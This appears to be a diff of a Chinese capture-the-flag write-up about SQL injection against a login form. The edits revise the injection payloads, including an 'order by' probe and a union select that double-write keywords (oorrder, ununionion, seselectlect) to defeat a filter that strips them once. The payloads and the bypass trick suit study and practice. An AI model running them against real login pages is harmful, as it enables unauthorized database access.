@@ -34,7 +34,7 @@ Your password is 'b805254663161a50d4ec808478ab5d6b'
 检查用户名处有无注点：“?username=1' order by 1%23&password=123”————发现奇怪的变成了“der 1#' and password='123''”不会都过滤了吧
 
 ```
-?username=' oorrder bbyy 4%23&password=12311 
+?username=11' oorrder bbyy 4%23&password=123 
 ```
 
 回显:
@@ -52,10 +52,8 @@ Unknown column '4' in 'order clause'
 直接输入，果然删的啥都不剩了：'1,2,3#' and password='123''
 
 ```
-?username=admin&password=12311' ununionion seselectlect 1,2,3%23
+?username=admin&password=123' ununionion seselectlect 1,2,3%23
 ```
-
-> 发现也不需要第一个被过滤的1
 
 简单粗暴得解:
 ```
